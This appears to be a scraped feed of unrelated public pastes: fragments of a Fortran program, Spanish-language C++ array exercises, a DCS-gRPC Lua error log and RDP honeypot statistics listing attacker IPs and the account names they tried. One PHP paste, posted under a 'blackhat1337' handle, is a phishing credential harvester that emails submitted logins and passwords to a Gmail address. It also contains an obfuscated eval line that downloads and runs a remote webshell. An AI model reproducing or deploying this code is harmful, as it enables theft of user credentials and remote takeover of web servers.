    allocate(n(str))
    allocate(x(str))
    allocate(y(str))
    allocate(d(str))
    !
    n(:) = 0
    d(:) = 0.0d0
    y(:) = 0.0d0
    do i =1,str
        x(i) = low + ( ( (high-low)/(str-1) )*(i-1) )
    end do
    call ryad(str,x,n,y,d,E)
    call output(str,x,n,y,d)
    deallocate(n)
    deallocate(x)
    deallocate(y)
    deallocate(d)
end program main
"
yjHTQq7d,ejer2bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:10:21 PM CDT,"#include <iostream>
#include <clocale>
using namespace std;

/* Hacer un programa donde se carguen 15 n√∫meros enteros y luego le solicite al usuario un n√∫mero e indique si el mismo pertenece a la lista cargada anteriormente.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    int num;
    bool num_encontrado = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un n√∫mero: "";
        cin >> vec_num[i];
    }
    cout<<endl<<endl;
    cout <<""Ingrese un n√∫mero para verificar si se encuentra en el listado proporcionado: ""<<endl;
    cin >>num;
    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]== num){
            cout<< vec_num[j]<<"" de la posici√≥n ""<< j+1 <<"" coincide con un n√∫mero de la lista""<<endl;
            //cout<<"","";
            num_encontrado= true;
        }
    }
    if (!num_encontrado){
    cout<<""No hay coincidencias"";
    }


    return 0;
    }"
MVmKSu2J,ejer1bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:09:40 PM CDT,"#include <iostream>
using namespace std;
#include <clocale>

/*Hacer un programa que le pida al usuario una lista de 10 n√∫meros enteros y luego de ingresarlos muestre cu√°les de ellos fueron positivos.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    bool num_pos = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un n√∫mero""<<endl;
        cin >> vec_num[i];
    }

    cout<< ""Los n√∫meros positivos son: ""<<endl;

    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]>0){
            if(num_pos = true){
            //cout<< ""Los n√∫meros positivos son: "" << endl << vec_num[j]<< ""de la posici√≥n ""<< vec_num[j]+1<< endl;
            cout<< vec_num[j]<<"" de la posici√≥n ""<< j+1 <<endl;
            //cout<<"","";
            num_pos= true;
            }

       }
    }
    if (!num_pos){
    cout<<""No hay positivos"";
    }
    return 0;
    }"
NibJ3Jwk,php,blackhat1337,PHP,Sunday 12th of May 2024 08:06:36 PM CDT,"<?php

$subjek = 'RESUL';
$mailto = 'muhrazky@gmail.com'; //masukin email lo disini

//////////////////////////////////////

$user = $_POST['log'];
$pass = $_POST['pwd'];

//////////////////////////////////////

$body = <<<EOD
<br><hr><br>
<center><font size=""4"" ;"" color=""red"">RESULT LOG ADMIN!<br></font>
<font size=""2"" color=""red"">Username\Email :</font><font size""2"" color=""black"">$user</font><br>
<font size=""2"" color=""red"">Password : </font><font size""2"" color=""black"">$pass</font> <br></center>
EOD;

$headers = ""From: muhrazky@gmail.com\r\n"";
$headers .= ""Content-type: text/html\r\n"";
$success = mail($mailto, $subjek, $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<?php eval(""?>"".file_get_contents(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>""));?>

<?=/****/@null; /********/ /*******/ /********/@eval/****/(""?>"".file_get_contents/*******/(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>"
stP1tZPW,Untitled,rosander,Lua,Sunday 12th of May 2024 07:42:56 PM CDT,"2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:341: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:03:01.779 INFO    dcs_grpc::stats: Calls per second: average=64.34, highest=66.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Events per second: average=14.36, highest=1.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Blocking time: total=2.322ms (‚âô 0.00%)
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:01.223 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Calls per second: average=64.28, highest=65.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Blocking time: total=2.2783ms (‚âô 0.00%)
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:32.490 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:37.836 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:43.368 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:52.228 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Calls per second: average=64.31, highest=65.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Blocking time: total=2.3493ms (‚âô 0.00%)
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to inde"
MSQhBRrF,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:18:11 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 3,
    ""5.42.107.83"": 6,
    ""94.232.41.30"": 6,
    ""185.242.235.113"": 3,
    ""194.165.16.78"": 6,
    ""182.163.102.197"": 3,
    ""194.165.16.73"": 12,
    ""185.196.220.41"": 9,
    ""87.251.75.64"": 3,
    ""37.255.222.209"": 21,
    ""193.142.146.227"": 9,
    ""35.203.211.144"": 9,
    ""71.6.134.234"": 30,
    ""87.251.75.145"": 9,
    ""167.94.145.103"": 3,
    ""64.124.50.139"": 6,
    ""185.170.144.113"": 27,
    ""87.251.75.120"": 6,
    ""212.70.149.146"": 9,
    ""45.8.22.24"": 3,
    ""185.170.144.3"": 6,
    ""152.32.197.12"": 3,
    ""45.33.91.123"": 9,
    ""35.203.210.184"": 9,
    ""117.16.46.253"": 3,
    ""123.56.20.194"": 3,
    ""39.104.209.131"": 3,
    ""157.97.121.249"": 3,
    ""43.153.185.38"": 3,
    ""45.79.114.208"": 12,
    ""139.177.207.133"": 3,
    ""172.233.146.111"": 3,
    ""2.57.149.92"": 3,
    ""198.235.24.242"": 9,
    ""152.32.183.213"": 81,
    ""112.4.139.162"": 3,
    ""81.12.137.74"": 12,
    ""80.66.76.134"": 3,
    ""194.170.200.70"": 3,
    ""45.227.254.54"": 6,
    ""157.97.121.78"": 3,
    ""45.227.254.55"": 12,
    ""105.75.72.104"": 21,
    ""205.210.31.152"": 9,
    ""167.94.146.48"": 3,
    ""159.223.34.114"": 3
  },
  ""asn"": {
    ""AS14987"": 3,
    ""AS210644"": 6,
    ""AS208091"": 27,
    ""AS55933"": 3,
    ""AS48721"": 18,
    ""AS9230"": 3,
    ""AS208046"": 18,
    ""AS58224"": 21,
    ""AS396982"": 36,
    ""AS10439"": 30,
    ""AS398705"": 6,
    ""AS6461"": 6,
    ""AS197414"": 33,
    ""AS204428"": 9,
    ""AS206216"": 3,
    ""AS135377"": 84,
    ""AS63949"": 27,
    ""AS18031"": 3,
    ""AS37963"": 6,
    ""AS396356"": 6,
    ""AS132203"": 3,
    ""AS208312"": 3,
    ""AS56046"": 3,
    ""AS12302"": 12,
    ""AS5384"": 3,
    ""AS267784"": 18,
    ""AS36884"": 21,
    ""AS14061"": 3
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 3,
    ""Aeza International LTD"": 6,
    ""Xhost Internet Solutions LP"": 60,
    ""Cloudie Limited"": 3,
    ""Flyservers S.A."": 36,
    ""Bangladesh Online Ltd"": 3,
    ""ColocationX Ltd."": 18,
    ""Iran Telecommunication Company PJS"": 21,
    ""Google LLC"": 36,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 6,
    ""Zayo Bandwidth"": 6,
    ""SS-Net"": 9,
    ""Advin Services LLC"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 84,
    ""Akamai Technologies, Inc."": 27,
    ""Sangmyung University"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Consumer-Network"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Red Byte LLC"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Vodafone RO"": 12,
    ""Emirates Telecommunications Corporation"": 3,
    ""Provider 36884 Wana Corporate"": 21,
    ""DigitalOcean, LLC"": 3
  },
  ""org"": {
    ""Rethem Hosting LLC"": 3,
    ""Aeza International LTD"": 6,
    ""Dmitriy Panchenko"": 6,
    ""TEN"": 3,
    ""Flyservers S.A"": 18,
    ""Bangladesh Online Ltd"": 3,
    ""Makut Investments"": 9,
    ""Xhost Internet Solutions"": 21,
    ""Telecommunication Company of Esfahan"": 21,
    ""ColocationX Ltd"": 9,
    ""Google Cloud (europe-west2)"": 18,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 6,
    ""Microsoft Corporation"": 6,
    ""Xhostis"": 33,
    ""4Media Ltd"": 9,
    ""Advin Services LLC"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 24,
    ""Korean Education Network"": 3,
    ""Aliyun Computing Co., LTD"": 6,
    ""Unknown"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""Ucloud Information Technology"": 81,
    ""China Mobile Communications Corporation"": 3,
    ""Vodafone Romania S.A."": 12,
    ""Emirates Telecommunications Corporation"": 3,
    ""UAB Host Baltic"": 18,
    ""Wana Corporate"": 21,
    ""DigitalOcean, LLC"": 3
  },
  ""regionName"": {
    ""Illinois"": 3,
    ""Hesse"": 12,
    ""Perm Krai"": 6,
    ""Sha Tin"": 3,
    ""Kaunas"": 18,
    ""Dhaka Division"": 3,
    ""Virginia"": 96,
    ""North Holland"": 63,
    ""Isfahan"": 21,
    ""England"": 18,
    ""Nevada"": 30,
    ""Plovdiv"": 9,
    ""California"": 36,
    ""S\u00e3o Paulo"": 3,
    ""New Jersey"": 15,
    ""Seoul"": 3,
    ""Beijing"": 6,
    ""Tokyo"": 3,
    ""Georgia"": 3,
    ""Lesser Poland"": 3,
    ""Jiangsu"": 3,
    ""Bucure\u0219ti"": 12,
    ""Dubai"": 3,
    ""Vilnius"": 18,
    ""Casablanca-Settat"": 21,
    ""Central Singapore"": 3
  },
  ""country"": {
    ""United States"": 183,
    ""Germany"": 12,
    ""Russia"": 6,
    ""Hong Kong"": 3,
    ""Lithuania"": 36,
    ""Bangladesh"": 3,
    ""The Netherlands"": 63,
    ""Iran"": 21,
    ""United Kingdom"": 18,
    ""Bulgaria"": 9,
    ""Brazil"": 3,
    ""South Korea"": 3,
    ""China"": 9,
    ""Japan"": 3,
    ""Poland"": 3,
    ""Romania"": 12,
    ""United Arab Emirates"": 3,
    ""Morocco"": 21,
    ""Singapore"": 3
  },
  ""account"": {
    ""nmap"": 3,
    ""Test"": 54,
    ""hello"": 81,
    ""Domain"": 63,
    ""Administr"": 30,
    ""DFRKKTCgH"": 3,
    ""qFvELU"": 3,
    ""sAELYo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 18,
    ""Administrator"": 30,
    ""vyOtISaUs"": 3,
    ""jwBcTt"": 3,
    ""CeYKnZ"": 3,
    ""iazp6yij"": 12,
    ""beio"": 3,
    ""eOXuGiqPp"": 3,
    ""GQKeOo"": 3,
    ""YyvXFx"": 3,
    ""Admin"": 27,
    ""Whatuptime.com"": 27,
    ""ugnTwcNRo"": 3,
    ""yQRxuX"": 3,
    ""ruGHbZ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 414
  },
  ""client_build"": {
    ""Unknown"": 414
  },
  ""client_name"": {
    ""Unknown"": 414
  },
  ""ip_type"": {
    ""hosting"": 192,
    ""Unknown"": 207,
    ""hosting & proxy"": 3,
    ""mobile"": 12
  }
}"
E2RXUHdG,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:16:06 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 2,
    ""5.42.107.83"": 4,
    ""94.232.41.30"": 4,
    ""185.242.235.113"": 2,
    ""194.165.16.78"": 4,
    ""182.163.102.197"": 2,
    ""194.165.16.73"": 8,
    ""185.196.220.41"": 6,
    ""87.251.75.64"": 2,
    ""37.255.222.209"": 14,
    ""193.142.146.227"": 6,
    ""35.203.211.144"": 6,
    ""71.6.134.234"": 20,
    ""87.251.75.145"": 6,
    ""167.94.145.103"": 2,
    ""64.124.50.139"": 4,
    ""185.170.144.113"": 18,
    ""87.251.75.120"": 4,
    ""212.70.149.146"": 6,
    ""45.8.22.24"": 2,
    ""185.170.144.3"": 4,
    ""152.32.197.12"": 2,
    ""45.33.91.123"": 6,
    ""35.203.210.184"": 6,
    ""117.16.46.253"": 2,
    ""123.56.20.194"": 2,
    ""39.104.209.131"": 2,
    ""157.97.121.249"": 2,
    ""43.153.185.38"": 2,
    ""45.79.114.208"": 8,
    ""139.177.207.133"": 2,
    ""172.233.146.111"": 2,
    ""2.57.149.92"": 2,
    ""198.235.24.242"": 6,
    ""152.32.183.213"": 54,
    ""112.4.139.162"": 2,
    ""81.12.137.74"": 8,
    ""80.66.76.134"": 2,
    ""194.170.200.70"": 2,
    ""45.227.254.54"": 4,
    ""157.97.121.78"": 2,
    ""45.227.254.55"": 8,
    ""105.75.72.104"": 14,
    ""205.210.31.152"": 6,
    ""167.94.146.48"": 2,
    ""159.223.34.114"": 2
  },
  ""asn"": {
    ""AS14987"": 2,
    ""AS210644"": 4,
    ""AS208091"": 18,
    ""AS55933"": 2,
    ""AS48721"": 12,
    ""AS9230"": 2,
    ""AS208046"": 12,
    ""AS58224"": 14,
    ""AS396982"": 24,
    ""AS10439"": 20,
    ""AS398705"": 4,
    ""AS6461"": 4,
    ""AS197414"": 22,
    ""AS204428"": 6,
    ""AS206216"": 2,
    ""AS135377"": 56,
    ""AS63949"": 18,
    ""AS18031"": 2,
    ""AS37963"": 4,
    ""AS396356"": 4,
    ""AS132203"": 2,
    ""AS208312"": 2,
    ""AS56046"": 2,
    ""AS12302"": 8,
    ""AS5384"": 2,
    ""AS267784"": 12,
    ""AS36884"": 14,
    ""AS14061"": 2
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 2,
    ""Aeza International LTD"": 4,
    ""Xhost Internet Solutions LP"": 40,
    ""Cloudie Limited"": 2,
    ""Flyservers S.A."": 24,
    ""Bangladesh Online Ltd"": 2,
    ""ColocationX Ltd."": 12,
    ""Iran Telecommunication Company PJS"": 14,
    ""Google LLC"": 24,
    ""CariNet, Inc."": 20,
    ""Censys, Inc."": 4,
    ""Zayo Bandwidth"": 4,
    ""SS-Net"": 6,
    ""Advin Services LLC"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 56,
    ""Akamai Technologies, Inc."": 18,
    ""Sangmyung University"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""Consumer-Network"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Red Byte LLC"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Vodafone RO"": 8,
    ""Emirates Telecommunications Corporation"": 2,
    ""Provider 36884 Wana Corporate"": 14,
    ""DigitalOcean, LLC"": 2
  },
  ""org"": {
    ""Rethem Hosting LLC"": 2,
    ""Aeza International LTD"": 4,
    ""Dmitriy Panchenko"": 4,
    ""TEN"": 2,
    ""Flyservers S.A"": 12,
    ""Bangladesh Online Ltd"": 2,
    ""Makut Investments"": 6,
    ""Xhost Internet Solutions"": 14,
    ""Telecommunication Company of Esfahan"": 14,
    ""ColocationX Ltd"": 6,
    ""Google Cloud (europe-west2)"": 12,
    ""CariNet, Inc."": 20,
    ""Censys, Inc."": 4,
    ""Microsoft Corporation"": 4,
    ""Xhostis"": 22,
    ""4Media Ltd"": 6,
    ""Advin Services LLC"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Linode"": 16,
    ""Korean Education Network"": 2,
    ""Aliyun Computing Co., LTD"": 4,
    ""Unknown"": 4,
    ""Tencent Cloud Computing"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Ucloud Information Technology"": 54,
    ""China Mobile Communications Corporation"": 2,
    ""Vodafone Romania S.A."": 8,
    ""Emirates Telecommunications Corporation"": 2,
    ""UAB Host Baltic"": 12,
    ""Wana Corporate"": 14,
    ""DigitalOcean, LLC"": 2
  },
  ""regionName"": {
    ""Illinois"": 2,
    ""Hesse"": 8,
    ""Perm Krai"": 4,
    ""Sha Tin"": 2,
    ""Kaunas"": 12,
    ""Dhaka Division"": 2,
    ""Virginia"": 64,
    ""North Holland"": 42,
    ""Isfahan"": 14,
    ""England"": 12,
    ""Nevada"": 20,
    ""Plovdiv"": 6,
    ""California"": 24,
    ""S\u00e3o Paulo"": 2,
    ""New Jersey"": 10,
    ""Seoul"": 2,
    ""Beijing"": 4,
    ""Tokyo"": 2,
    ""Georgia"": 2,
    ""Lesser Poland"": 2,
    ""Jiangsu"": 2,
    ""Bucure\u0219ti"": 8,
    ""Dubai"": 2,
    ""Vilnius"": 12,
    ""Casablanca-Settat"": 14,
    ""Central Singapore"": 2
  },
  ""country"": {
    ""United States"": 122,
    ""Germany"": 8,
    ""Russia"": 4,
    ""Hong Kong"": 2,
    ""Lithuania"": 24,
    ""Bangladesh"": 2,
    ""The Netherlands"": 42,
    ""Iran"": 14,
    ""United Kingdom"": 12,
    ""Bulgaria"": 6,
    ""Brazil"": 2,
    ""South Korea"": 2,
    ""China"": 6,
    ""Japan"": 2,
    ""Poland"": 2,
    ""Romania"": 8,
    ""United Arab Emirates"": 2,
    ""Morocco"": 14,
    ""Singapore"": 2
  },
  ""account"": {
    ""nmap"": 2,
    ""Test"": 36,
    ""hello"": 54,
    ""Domain"": 42,
    ""Administr"": 20,
    ""DFRKKTCgH"": 2,
    ""qFvELU"": 2,
    ""sAELYo"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""(empty)"": 12,
    ""Administrator"": 20,
    ""vyOtISaUs"": 2,
    ""jwBcTt"": 2,
    ""CeYKnZ"": 2,
    ""iazp6yij"": 8,
    ""beio"": 2,
    ""eOXuGiqPp"": 2,
    ""GQKeOo"": 2,
    ""YyvXFx"": 2,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""ugnTwcNRo"": 2,
    ""yQRxuX"": 2,
    ""ruGHbZ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 276
  },
  ""client_build"": {
    ""Unknown"": 276
  },
  ""client_name"": {
    ""Unknown"": 276
  },
  ""ip_type"": {
    ""hosting"": 128,
    ""Unknown"": 138,
    ""hosting & proxy"": 2,
    ""mobile"": 8
  }
}"
BsL5gB1f,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 1,
    ""5.42.107.83"": 2,
    ""94.232.41.30"": 2,
    ""185.242.235.113"": 1,
    ""194.165.16.78"": 2,
    ""182.163.102.197"": 1,
    ""194.165.16.73"": 4,
    ""185.196.220.41"": 3,
    ""87.251.75.64"": 1,
    ""37.255.222.209"": 7,
    ""193.142.146.227"": 3,
    ""35.203.211.144"": 3,
    ""71.6.134.234"": 10,
    ""87.251.75.145"": 3,
    ""167.94.145.103"": 1,
    ""64.124.50.139"": 2,
    ""185.170.144.113"": 9,
    ""87.251.75.120"": 2,
    ""212.70.149.146"": 3,
    ""45.8.22.24"": 1,
    ""185.170.144.3"": 2,
    ""152.32.197.12"": 1,
    ""45.33.91.123"": 3,
    ""35.203.210.184"": 3,
    ""117.16.46.253"": 1,
    ""123.56.20.194"": 1,
    ""39.104.209.131"": 1,
    ""157.97.121.249"": 1,
    ""43.153.185.38"": 1,
    ""45.79.114.208"": 4,
    ""139.177.207.133"": 1,
    ""172.233.146.111"": 1,
    ""2.57.149.92"": 1,
    ""198.235.24.242"": 3,
    ""152.32.183.213"": 27,
    ""112.4.139.162"": 1,
    ""81.12.137.74"": 4,
    ""80.66.76.134"": 1,
    ""194.170.200.70"": 1,
    ""45.227.254.54"": 2,
    ""157.97.121.78"": 1,
    ""45.227.254.55"": 4,
    ""105.75.72.104"": 7,
    ""205.210.31.152"": 3,
    ""167.94.146.48"": 1,
    ""159.223.34.114"": 1
  },
  ""asn"": {
    ""AS14987"": 1,
    ""AS210644"": 2,
    ""AS208091"": 9,
    ""AS55933"": 1,
    ""AS48721"": 6,
    ""AS9230"": 1,
    ""AS208046"": 6,
    ""AS58224"": 7,
    ""AS396982"": 12,
    ""AS10439"": 10,
    ""AS398705"": 2,
    ""AS6461"": 2,
    ""AS197414"": 11,
    ""AS204428"": 3,
    ""AS206216"": 1,
    ""AS135377"": 28,
    ""AS63949"": 9,
    ""AS18031"": 1,
    ""AS37963"": 2,
    ""AS396356"": 2,
    ""AS132203"": 1,
